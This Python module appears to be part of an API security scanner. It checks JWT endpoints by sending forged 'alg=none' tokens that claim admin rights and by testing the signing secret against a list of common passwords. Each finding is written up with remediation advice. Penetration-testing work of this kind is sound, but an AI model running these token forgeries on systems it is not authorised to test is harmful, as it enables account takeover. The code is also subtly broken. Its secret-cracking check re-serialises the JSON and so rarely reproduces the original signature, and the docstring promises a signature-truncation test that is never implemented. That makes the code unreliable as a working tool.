import json
import base64
import hmac
import hashlib
import httpx
from typing import List, Dict, Any, Optional

COMMON_SECRETS = [
    "secret", "jwt_secret", "secret123", "admin", "admin123", 
    "123456", "supersecret", "development", "staging", "test", "password"
]

def b64_decode(data: str) -> str:
    rem = len(data) % 4
    if rem > 0:
        data += "=" * (4 - rem)
    return base64.urlsafe_b64decode(data).decode("utf-8", errors="ignore")

def b64_encode(data: str) -> str:
    return base64.urlsafe_b64encode(data.encode("utf-8")).decode("utf-8").rstrip("=")

def parse_jwt(token: str) -> Optional[Dict[str, Any]]:
    parts = token.strip().replace("Bearer ", "").split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(b64_decode(parts[0]))
        payload = json.loads(b64_decode(parts[1]))
        return {"header": header, "payload": payload, "signature": parts[2], "raw": token}
    except Exception:
        return None

async def audit_jwt_cryptography(
    target_url: str,
    routes: List[str],
    client: httpx.AsyncClient,
    sample_token: Optional[str],
    scan_id: int
) -> List[Dict[str, Any]]:
    """
    Active JWT Cryptographic Attack Suite:
    1. alg=none header tampering & signature stripping
    2. Weak HMAC-SHA256 secret dictionary verification
    3. Signature truncation
    """
    findings = []
    
    # Try sample token or fallback to common test bearer token
    token = sample_token or "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDQyIiwibmFtZSI6IlRlc3QgVXNlciIsImlhdCI6MTUxNjIzOTAyMn0.XbPfbIHMI6arZ3Y922BhjWgQzWXcXNrz0ogtVhfEd2o"
    jwt_data = parse_jwt(token)
    if not jwt_data:
        return findings

    base_url = target_url.rstrip("/")
    test_endpoints = list(set([f"{base_url}/api/user", f"{base_url}/api/profile", f"{base_url}/api/orders"] + routes[:4]))

    header = jwt_data["header"]
    payload = jwt_data["payload"]

    # Attack 1: alg=none Bypass
    none_header = b64_encode(json.dumps({"alg": "none", "typ": "JWT"}))
    none_payload = b64_encode(json.dumps({**payload, "is_admin": True, "role": "admin"}))
    alg_none_token = f"{none_header}.{none_payload}."

    for ep in test_endpoints:
        try:
            res = await client.get(ep, headers={"Authorization": f"Bearer {alg_none_token}"}, timeout=4.0)
            if res.status_code in [200, 204] and len(res.text) > 10:
                findings.append({
                    "scan_id": scan_id,
                    "title": "Critical JWT Vulnerability: 'alg=none' Signature Bypass Accepted",
                    "category": "Authentication & Authorization",
                    "cwe": "CWE-347",
                    "owasp": "API2:2023-Broken Authentication",
                    "cvss": 9.8,
                    "severity": "critical",
                    "status": "open",
                    "endpoint": ep,
                    "method": "GET",
                    "curl": f"curl -X GET '{ep}' -H 'Authorization: Bearer {alg_none_token}'",
                    "expected_response": "HTTP 401 Unauthorized / Token signature validation failed",
                    "actual_response": f"HTTP {res.status_code}\n\n{res.text[:300]}",
                    "business_impact": "Attackers can forge arbitrary administrative tokens and impersonate any user by specifying `alg: none`.",
                    "remediation": "Explicitly whitelist allowed cryptographic algorithms (e.g. `algorithms=['HS256']`) and reject unverified 'none' algorithm headers.",
                    "evidence": f"Server returned HTTP {res.status_code} and valid payload when supplied an unsigned token with header `alg: none`."
                })
                return findings
        except Exception:
            continue

    # Attack 2: Weak HMAC Secret Cracking (Dictionary Attack)
    signing_input = f"{b64_encode(json.dumps(header))}.{b64_encode(json.dumps(payload))}".encode("utf-8")
    for secret in COMMON_SECRETS:
        sig = hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha256).digest()
        encoded_sig = base64.urlsafe_b64encode(sig).decode("utf-8").rstrip("=")
        
        if encoded_sig == jwt_data["signature"]:
            findings.append({
                "scan_id": scan_id,
                "title": f"Weak JWT HMAC Signing Secret: '{secret}'",
                "category": "Authentication & Authorization",
                "cwe": "CWE-522",
                "owasp": "API2:2023-Broken Authentication",
                "cvss": 8.9,
                "severity": "high",
                "status": "open",
                "endpoint": f"{base_url}/api/auth",
                "method": "POST",
                "curl": f"# Token signature cracked with dictionary word: '{secret}'",
                "expected_response": "High-entropy 256-bit cryptographically secure secret key",
                "actual_response": f"Vulnerable to dictionary attack. Secret discovered: '{secret}'",
                "business_impact": "Attackers can generate forged JWT tokens for any user account because the server uses a trivial signing secret.",
                "remediation": "Generate a high-entropy 256-bit random secret key (e.g. `openssl rand -hex 32`) and store it securely in environment variables.",
                "evidence": f"HMAC-SHA256 signature matched common secret dictionary entry '{secret}'."
            })
            return findings

    return findings
